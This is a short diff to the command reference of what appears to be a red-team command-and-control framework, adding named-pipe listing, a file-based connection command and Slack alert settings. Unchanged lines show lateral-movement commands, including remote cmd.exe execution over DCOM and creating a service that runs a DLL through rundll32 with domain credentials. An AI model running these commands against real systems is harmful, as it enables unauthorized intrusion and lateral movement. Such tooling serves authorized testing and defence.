@@ -86,6 +86,7 @@ resolvednsname google.com
 loadmodule Seatbelt.exe
 loadmoduleforce
 listmodules
+ls-pipes
 modulesloaded
 run-exe Core.Program Core
 run-dll Seatbelt.Program Seatbelt UserChecks
@@ -220,6 +221,8 @@ dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c no
 sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
 pbind-connect hostname
 pbind-connect hostname <pipename> <secret>
+fcomm-connect
+fcomm-connect filepath
 
 * Lateral Movement with Pre-Built Payload:
 ===========================================
@@ -551,6 +554,9 @@ generate-reports
 generate-csvs
 set-pushover-applicationtoken df2
 set-pushover-userkeys 44789
+set-slack-userid UHEJYT2AA
+set-slack-channel #bots
+set-slack-bottoken xobo-
 set-defaultbeacon 60
 get-killdate
 set-killdate 22/10/2019
